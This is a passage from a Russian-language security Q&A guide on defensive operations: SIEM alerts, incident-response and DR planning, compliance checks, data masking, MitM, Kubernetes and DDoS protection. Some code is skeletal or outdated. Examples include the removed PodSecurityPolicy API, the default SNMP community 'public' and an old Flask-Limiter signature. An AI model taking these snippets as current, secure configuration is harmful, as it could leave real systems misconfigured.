**3. Настройка алертов:**

```python
class SIEMAlertRules:
    def check_brute_force(self, events):
        # Поиск множественных неудачных попыток входа
        failed_logins = [
            e for e in events 
            if e['event_type'] == 'auth_failed'
        ]
        
        # Группировка по IP
        ip_counts = {}
        for event in failed_logins:
            ip = event['src_ip']
            ip_counts[ip] = ip_counts.get(ip, 0) + 1
        
        # Алерт при превышении порога
        for ip, count in ip_counts.items():
            if count >= 5:
                self.trigger_alert(
                    f"Brute force attack from {ip}: {count} failed attempts"
                )
    
    def check_lateral_movement(self, events):
        # Обнаружение попыток горизонтального перемещения
        unique_ips = set(e['src_ip'] for e in events)
        
        if len(unique_ips) > 10:
            self.trigger_alert(
                f"Possible lateral movement: {len(unique_ips)} unique IPs"
            )
```

**4. Дашборд безопасности:**

```python
from flask import Flask, render_template, jsonify

app = Flask(__name__)

@app.route('/security-dashboard')
def security_dashboard():
    # Метрики безопасности
    metrics = {
        'total_events_24h': count_events(hours=24),
        'critical_alerts': count_critical_alerts(),
        'top_threats': get_top_threats(),
        'geographic_distribution': get_geo_distribution()
    }
    return render_template('dashboard.html', metrics=metrics)
```

**5. Интеграция источников данных:**

```python
class SIEMConnector:
    def connect_sources(self):
        sources = [
            {'type': 'syslog', 'host': '10.0.1.10', 'port': 514},
            {'type': 'snmp', 'host': '10.0.1.20', 'community': 'public'},
            {'type': 'api', 'url': 'https://api.example.com/logs'}
        ]
        
        for source in sources:
            self.add_source(source)
```

---

### 190. Как разработать и утвердить IR-план (план реагирования на инциденты)?

**Ответ:** Разработка **IR (Incident Response)** плана:

**1. Структура IR-плана:**

```markdown
# IR Plan

## 1. Команда реагирования
- Incident Response Manager
- Security Analysts
- System Administrators
- Legal Counsel
- Communications

## 2. Классификация инцидентов
- Critical: Полная компрометация системы
- High: Частичная компрометация
- Medium: Подозрительная активность
- Low: Минорные события

## 3. Процедуры реагирования
### 3.1 Обнаружение
### 3.2 Анализ
### 3.3 Сдерживание
### 3.4 Устранение
### 3.5 Восстановление
### 3.6 Пост-инцидентный анализ

## 4. Контакты
- IR Team Lead: +7-XXX-XXX-XXXX
- External Security Firm: +7-YYY-YYY-YYYY
- Law Enforcement: 102
```

**2. Автоматизация реагирования:**

```python
class IncidentResponseAutomation:
    def handle_incident(self, incident):
        # Классификация
        severity = self.classify_incident(incident)
        
        # Автоматические действия
        if severity == 'critical':
            self.isolate_affected_systems(incident)
            self.notify_ir_team(incident)
            self.escalate_to_management(incident)
        
        # Создание задачи
        self.create_incident_ticket(incident)
```

**3. Процедуры сдерживания:**

```python
def contain_incident(incident):
    actions = []
    
    if incident['type'] == 'malware':
        # Изоляция заражённой системы
        actions.append(isolate_system(incident['affected_host']))
        actions.append(block_network_access(incident['affected_host']))
    
    elif incident['type'] == 'unauthorized_access':
        # Блокировка учётной записи
        actions.append(disable_account(incident['username']))
        actions.append(invalidate_sessions(incident['username']))
    
    return actions
```

**4. Утверждение плана:**

- **Review:** Проверка плана командой безопасности
- **Approval:** Утверждение руководством
- **Distribution:** Распространение среди заинтересованных сторон
- **Training:** Обучение команды IR
- **Testing:** Регулярные учения

---

### 191. Как протестировать DR-план (план восстановления после аварии)?

**Ответ:** Тестирование **DR (Disaster Recovery)** плана:

**1. Типы тестирования:**

```python
class DRPlanTesting:
    def tabletop_exercise(self):
        # Настольное учение
        scenario = self.generate_scenario()
        participants = self.get_dr_team()
        
        # Симуляция сценария
        for step in scenario.steps:
            response = participants.discuss(step)
            self.evaluate_response(response)
    
    def walkthrough_test(self):
        # Пошаговая проверка процедур
        for procedure in self.dr_plan.procedures:
            result = self.execute_procedure(procedure, test_mode=True)
            self.validate_result(result)
    
    def simulation_test(self):
        # Симуляция частичной аварии
        self.simulate_failure('database')
        self.measure_recovery_time()
        self.validate_data_integrity()
    
    def full_interruption_test(self):
        # Полное тестирование восстановления
        self.shutdown_production()
        self.execute_full_recovery()
        self.validate_all_systems()
```

**2. Метрики тестирования:**

```python
class DRMetrics:
    def calculate_rto(self, test_results):
        # Recovery Time Objective
        recovery_start = test_results['recovery_start_time']
        recovery_end = test_results['recovery_end_time']
        rto = (recovery_end - recovery_start).total_seconds()
        return rto
    
    def calculate_rpo(self, test_results):
        # Recovery Point Objective
        last_backup = test_results['last_backup_time']
        failure_time = test_results['failure_time']
        rpo = (failure_time - last_backup).total_seconds()
        return rpo
```

**3. Отчёт о тестировании:**

```python
def generate_dr_test_report(test_results):
    report = {
        'test_date': test_results['date'],
        'test_type': test_results['type'],
        'scenario': test_results['scenario'],
        'metrics': {
            'rto': calculate_rto(test_results),
            'rpo': calculate_rpo(test_results),
            'data_loss': test_results['data_loss']
        },
        'issues_found': test_results['issues'],
        'recommendations': generate_recommendations(test_results)
    }
    return report
```

---

### 192. Как проверить соответствие требованиям GDPR, PCI DSS, ФЗ-152?

**Ответ:** Проверка соответствия требованиям:

**1. GDPR Compliance:**

```python
class GDPRCompliance:
    def check_compliance(self):
        checks = {
            'data_mapping': self.map_personal_data(),
            'consent_management': self.check_consent_system(),
            'data_minimization': self.check_data_minimization(),
            'right_to_access': self.check_access_procedures(),
            'right_to_deletion': self.check_deletion_procedures(),
            'data_breach_notification': self.check_breach_procedures(),
            'encryption': self.check_encryption(),
            'access_controls': self.check_access_controls()
        }
        return checks
    
    def check_consent_system(self):
        # Проверка системы управления согласием
        return has_consent_tracking() and has_consent_withdrawal()
    
    def check_right_to_deletion(self):
        # Проверка процедур удаления данных
        return has_data_deletion_procedure() and can_delete_all_user_data()
```

**2. PCI DSS Compliance:**

```python
class PCIDSSCompliance:
    def check_requirements(self):
        requirements = {
            'firewall_config': self.check_firewall(),
            'password_policy': self.check_password_policy(),
            'card_data_protection': self.check_card_data_protection(),
            'encryption': self.check_encryption(),
            'vulnerability_management': self.check_vuln_management(),
            'access_control': self.check_access_control(),
            'monitoring': self.check_monitoring(),
            'testing': self.check_security_testing()
        }
        return requirements
    
    def check_card_data_protection(self):
        # Проверка защиты данных карт
        return (
            no_card_data_stored() or
            (card_data_encrypted() and access_logged())
        )
```

**3. ФЗ-152 Compliance:**

```python
class FZ152Compliance:
    def check_compliance(self):
        checks = {
            'consent_processing': self.check_consent(),
            'data_localization': self.check_localization(),
            'data_protection': self.check_protection(),
            'notification_authority': self.check_notification(),
            'access_rights': self.check_access_rights()
        }
        return checks
    
    def check_localization(self):
        # Проверка локализации данных граждан РФ
        return personal_data_stored_in_russia()
```

**4. Автоматизированная проверка:**

```bash
#!/bin/bash
# compliance_check.sh

echo "=== GDPR Compliance Check ==="
check_gdpr_requirements

echo "=== PCI DSS Compliance Check ==="
check_pci_dss_requirements

echo "=== ФЗ-152 Compliance Check ==="
check_fz152_requirements

# Генерация отчёта
generate_compliance_report > compliance_report.json
```

---

### 193. Как настроить маскировку данных (data masking)?

**Ответ:** Настройка маскировки данных:

**1. Маскирование в базе данных:**

```sql
-- PostgreSQL: Функция маскирования
CREATE OR REPLACE FUNCTION mask_email(email TEXT)
RETURNS TEXT AS $$
BEGIN
    RETURN regexp_replace(
        email,
        '^(.{1,3}).*(@.+)$',
        '\1***\2',
        'g'
    );
END;
$$ LANGUAGE plpgsql;

-- Использование
SELECT mask_email('john.doe@example.com');  -- joh***@example.com
```

**2. Маскирование в приложении:**

```python
import re
from cryptography.fernet import Fernet

class DataMasking:
    def __init__(self):
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
    
    def mask_email(self, email):
        parts = email.split('@')
        if len(parts) == 2:
            username = parts[0]
            domain = parts[1]
            masked_username = username[:2] + '***' + username[-1] if len(username) > 3 else '***'
            return f"{masked_username}@{domain}"
        return email
    
    def mask_phone(self, phone):
        # +7 (XXX) XXX-XX-XX -> +7 (***) ***-**-XX
        return re.sub(r'(\+?\d{1,3}\s*\(?)(\d{1,3})(\)?\s*)(\d{1,3})(-?)(\d{1,2})(-?)(\d{1,2})',
                     r'\1***\3***\5**\7**',
                     phone)
    
    def mask_credit_card(self, card_number):
        # 1234 5678 9012 3456 -> **** **** **** 3456
        return re.sub(r'(\d{4}\s?){3}(\d{4})', r'**** **** **** \2', card_number)
    
    def mask_ssn(self, ssn):
        # XXX-XX-XXXX -> ***-**-XXXX
        return re.sub(r'(\d{3})-(\d{2})-(\d{4})', r'***-**-\3', ssn)
```

**3. Маскирование для логов:**

```python
class SecureLogger:
    SENSITIVE_PATTERNS = [
        (r'password["\']?\s*[:=]\s*["\']?([^"\'\s]+)', r'password="***"'),
        (r'api_key["\']?\s*[:=]\s*["\']?([^"\'\s]+)', r'api_key="***"'),
        (r'\b\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?(\d{4})\b', r'****-****-****-\1'),
    ]
    
    def mask_log(self, message):
        masked = str(message)
        for pattern, replacement in self.SENSITIVE_PATTERNS:
            masked = re.sub(pattern, replacement, masked, flags=re.IGNORECASE)
        return masked
```

**4. Маскирование при экспорте:**

```python
def export_data_with_masking(data, user_role):
    masked_data = []
    
    for record in data:
        masked_record = record.copy()
        
        # Маскирование в зависимости от роли
        if user_role != 'admin':
            if 'email' in masked_record:
                masked_record['email'] = mask_email(masked_record['email'])
            if 'phone' in masked_record:
                masked_record['phone'] = mask_phone(masked_record['phone'])
        
        masked_data.append(masked_record)
    
    return masked_data
```

---

### 194. Какие механизмы обеспечивают защиту от атак Man-in-the-Middle?

**Ответ:** Механизмы защиты от **MitM (Man-in-the-Middle)** атак:

**1. TLS/SSL (HTTPS):**
- Шифрование трафика
- Проверка сертификатов сервера
- Валидация цепочки сертификатов

**2. Certificate Pinning:**
```python
import ssl
import socket
import hashlib

def verify_certificate_pin(hostname, port, expected_pin):
    context = ssl.create_default_context()
    
    with socket.create_connection((hostname, port)) as sock:
        with context.wrap_socket(sock, server_hostname=hostname) as ssock:
            cert = ssock.getpeercert(True)  # Получение DER-encoded сертификата
            cert_hash = hashlib.sha256(cert).hexdigest()
            
            if cert_hash != expected_pin:
                raise ssl.CertificateError("Certificate pin mismatch!")
```

**3. HSTS (HTTP Strict Transport Security):**
```nginx
# Nginx
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
```

**4. Certificate Transparency:**
- Мониторинг выданных сертификатов
- Обнаружение поддельных сертификатов

**5. DNSSEC:**
- Защита DNS запросов от подмены
- Проверка подписи DNS ответов

**6. Mutual TLS (mTLS):**
```nginx
# Требование клиентских сертификатов
ssl_verify_client on;
ssl_client_certificate /etc/ssl/certs/client-ca.crt;
```

---

### 195. Какие средства защиты применяются при физической краже устройств?

**Ответ:** Средства защиты при физической краже устройств:

**1. Шифрование дисков:**
- **BitLocker** (Windows)
- **FileVault** (macOS)
- **LUKS** (Linux)

**2. Удалённое стирание:**
```python
class RemoteWipe:
    def initiate_wipe(self, device_id):
        # Отправка команды на устройство
        send_command(device_id, 'wipe_device')
        
        # Проверка выполнения
        status = check_wipe_status(device_id)
        return status
```

**3. Геолокация:**
- Отслеживание местоположения устройства
- Удалённая блокировка

**4. Аутентификация:**
- Сильные пароли
- Биометрическая аутентификация
- Двухфакторная аутентификация

**5. Политики безопасности:**
- Автоблокировка при неактивности
- Ограничение количества попыток входа
- Удалённая блокировка после кражи

---

### 196. Какие меры защиты данных применяются в облачной инфраструктуре?

**Ответ:** Меры защиты данных в облачной инфраструктуре:

**1. Шифрование:**
- Шифрование данных в покое (encryption at rest)
- Шифрование данных при передаче (encryption in transit)
- Управление ключами (KMS)

**2. Identity and Access Management:**
- IAM политики
- Принцип наименьших привилегий
- Многофакторная аутентификация

**3. Network Security:**
- Security Groups
- Network ACLs
- VPC изоляция
- Private endpoints

**4. Мониторинг:**
- CloudTrail (AWS) / Activity Log (Azure)
- CloudWatch / Monitor
- SIEM интеграция

**5. Compliance:**
- SOC 2, ISO 27001 сертификация провайдера
- Shared Responsibility Model
- Регулярные аудиты

---

### 197. Какие практики используются для сегментации сети?

**Ответ:** Практики сегментации сети:

**1. VLAN сегментация:**
```bash
# Настройка VLAN
vlan 100
 name management
vlan 200
 name servers
vlan 300
 name clients
```

**2. Firewall правила:**
```bash
# Разрешение только необходимого трафика
iptables -A FORWARD -s 192.168.1.0/24 -d 10.0.1.0/24 -p tcp --dport 3306 -j ACCEPT
iptables -A FORWARD -s 192.168.1.0/24 -d 10.0.1.0/24 -j DROP
```

**3. Micro-segmentation:**
- Изоляция на уровне хоста
- Zero-trust архитектура
- Политики на основе идентичности

**4. Software-Defined Networking (SDN):**
- Централизованное управление
- Динамические политики
- Автоматизация

---

### 198. Как обеспечить безопасность при развёртывании в Kubernetes?

**Ответ:** Безопасность в Kubernetes:

**1. Pod Security Policies:**
```yaml
apiVersion: policy/v1beta1
kind: PodSecurityPolicy
metadata:
  name: restricted
spec:
  privileged: false
  allowPrivilegeEscalation: false
  requiredDropCapabilities:
    - ALL
  volumes:
    - 'configMap'
    - 'emptyDir'
  hostNetwork: false
  hostIPC: false
  hostPID: false
  runAsUser:
    rule: 'MustRunAsNonRoot'
  seLinux:
    rule: 'RunAsAny'
```

**2. Network Policies:**
```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-all
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
```

**3. RBAC:**
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: pod-reader
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["get", "watch", "list"]
```

**4. Secrets Management:**
```yaml
apiVersion: v1
kind: Secret
metadata:
  name: my-secret
type: Opaque
data:
  password: <base64-encoded>
```

**5. Image Security:**
- Сканирование образов на уязвимости
- Использование минимальных базовых образов
- Запрет root пользователя

---

### 199. Какие средства защиты применяются в микросервисных архитектурах?

**Ответ:** Средства защиты в микросервисах:

**1. Service Mesh (Istio):**
- mTLS между сервисами
- Авторизация на уровне сервисов
- Мониторинг и трассировка

**2. API Gateway:**
- Единая точка аутентификации
- Rate limiting
- WAF функциональность

**3. Secrets Management:**
- Vault
- Kubernetes Secrets
- Cloud KMS

**4. Network Policies:**
- Изоляция между сервисами
- Микро-сегментация

**5. Service-to-Service Authentication:**
- mTLS
- JWT токены
- Service accounts

---

### 200. Какие методы используются для защиты от атак типа DDoS?

**Ответ:** Методы защиты от **DDoS (Distributed Denial of Service)**:

**1. Rate Limiting:**
```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

app = Flask(__name__)
limiter = Limiter(
    app,
    key_func=get_remote_address,
    default_limits=["100 per hour"]
)

@app.route('/api/data')
@limiter.limit("10 per minute")
def get_data():
    return {"data": "..."}
```

**2. CDN и Load Balancing:**
- Распределение нагрузки
- Географическое распределение
- Кэширование

**3. DDoS Protection Services:**
- Cloudflare
- AWS Shield
- Azure DDoS Protection

**4. Firewall правила:**
```bash
# Ограничение соединений
iptables -A INPUT -p tcp --dport 80 -m connlimit --connlimit-above 10 -j DROP

# Rate limiting
iptables -A INPUT -p tcp --dport 80 -m limit --limit 25/minute --limit-burst 100 -j ACCEPT
```

**5. Мониторинг и обнаружение:**
- Анализ трафика в реальном времени
- Аномалийное обнаружение
- Автоматическое реагирование

---

## Источники:
- Best practices в области операционной безопасности
- NIST Guidelines
- CIS Benchmarks
- OWASP Security Guidelines
- Опыт настройки инфраструктуры безопасности


